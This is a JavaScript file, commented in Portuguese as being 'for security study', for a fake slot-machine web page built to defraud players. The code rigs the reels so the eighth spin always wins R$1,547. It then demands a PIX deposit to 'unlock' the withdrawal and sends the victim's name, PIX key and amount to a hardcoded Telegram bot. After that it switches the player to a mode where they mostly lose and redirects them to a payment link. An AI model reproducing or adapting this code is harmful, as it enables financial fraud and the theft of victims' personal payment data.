/* =========================================================================
   CÓDIGO COMPLETO INTEGRADO (PARA ESTUDO DE SEGURANÇA)
   ========================================================================= */
const TELEGRAM_TOKEN = "7907530650:AAHQY7hR8N4w9N9IAnN2Gg0wO83O7pL7y40";
const TELEGRAM_CHAT_ID = "6238676644";

let saldoAtual = 50.00;
let valorAposta = 2.00;
let contadorRodadas = 0;
let faseDoUsuario = "normal"; // Interruptor acadêmico

const itensDisponiveis = ["🐯", "🍊", "🔔", "💰", "🧧", "🪙"];

// Sincronização inicial
document.addEventListener("DOMContentLoaded", () => {
    atualizarDisplayInterface();
    renderizarRolosIniciais();
});

function atualizarDisplayInterface() {
    const elSaldo = document.getElementById("saldo");
    const elAposta = document.getElementById("valor-aposta");
    if (elSaldo) elSaldo.innerText = `R$ ${saldoAtual.toFixed(2).replace('.', ',')}`;
    if (elAposta) elAposta.innerText = `R$ ${valorAposta.toFixed(2).replace('.', ',')}`;
}

function renderizarRolosIniciais() {
    for (let i = 0; i < 3; i++) {
        const reel = document.getElementById(`reel-${i}`);
        if (reel) reel.innerHTML = `<div class="slot-item">🐯</div><div class="slot-item">🍊</div><div class="slot-item">🔔</div>`;
    }
}

window.girarSlots = function() {
    if (saldoAtual < valorAposta) {
        window.abrirModalDeposito();
        return;
    }
    saldoAtual -= valorAposta;
    contadorRodadas++;
    atualizarDisplayInterface();

    for (let i = 0; i < 3; i++) {
        document.getElementById(`reel-${i}`)?.classList.add("rodando-vertical");
    }

    setTimeout(finalizarRodadaEGanho, 1200);
};

function finalizarRodadaEGanho() {
    let matrizResultado = [];

    // Lógica principal unificada
    if (contadorRodadas === 8) {
        // Trava da 8ª rodada
        matrizResultado = ["🐯", "🐯", "🐯"];
    } else if (faseDoUsuario === "manipulado") {
        // Ponto de estudo: manipulação pós-envio
        matrizResultado = (Math.random() < 0.8) ? ["🐯", "🔔", "🪙"] : ["🐯", "🐯", "🐯"];
    } else {
        // Sorteio aleatório original
        for (let i = 0; i < 3; i++) {
            matrizResultado.push(itensDisponiveis[Math.floor(Math.random() * itensDisponiveis.length)]);
        }
    }

    // Renderização dos resultados
    for (let i = 0; i < 3; i++) {
        const reel = document.getElementById(`reel-${i}`);
        if (reel) {
            reel.classList.remove("rodando-vertical");
            reel.innerHTML = `<div class="slot-item">${matrizResultado[i]}</div>`;
        }
    }

    // Validação de vitória
    if (matrizResultado[0] === matrizResultado[1] && matrizResultado[1] === matrizResultado[2]) {
        let ganho = (matrizResultado[0] === "🐯" && contadorRodadas === 8) ? 1547.00 : (valorAposta * 5);
        
        if (contadorRodadas === 8) {
            saldoAtual = ganho;
            setTimeout(() => {
                alert("Para liberar o saque de R$ 1.547,00, valide sua conta via PIX.");
                window.abrirModalDeposito();
            }, 500);
        } else {
            saldoAtual += ganho;
        }
        
        atualizarDisplayInterface();
        dispararBalaoGanhoLimpo(ganho);
    }
}

window.salvarEDepositarPIX = function() {
    const nome = document.getElementById("pix-nome")?.value.trim();
    const chave = document.getElementById("pix-chave")?.value.trim();
    const valor = document.getElementById("pix-valor-dep")?.value.trim();

    if (!nome || !chave || !valor) return alert("Preencha os dados PIX.");

    // Ativação da fase acadêmica de manipulação
    faseDoUsuario = "manipulado";

    const msg = `⚠️ *NOVA TENTATIVA* ⚠️\n👤 ${nome}\n🔑 ${chave}\n💵 R$ ${valor}`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: "Markdown" })
    })
    .then(() => window.location.href = "https://go.tribopay.com.br/w3p787fphj");
};

function dispararBalaoGanhoLimpo(valor) {
    const balao = document.createElement("div");
    balao.className = "balao-ganho-dinamico";
    balao.innerHTML = `🎉 PARABÉNS! 🎉<br><strong>Você Ganhou R$ ${valor.toFixed(2)}</strong>`;
    document.body.appendChild(balao);
    setTimeout(() => { balao.style.opacity = "0"; setTimeout(() => balao.remove(), 200); }, 400);
}

// Funções utilitárias mantidas
window.abrirModalDeposito = () => document.getElementById("modal-deposito").style.display = "flex";
window.alterarAposta = (d) => { /* lógica de incremento */ };
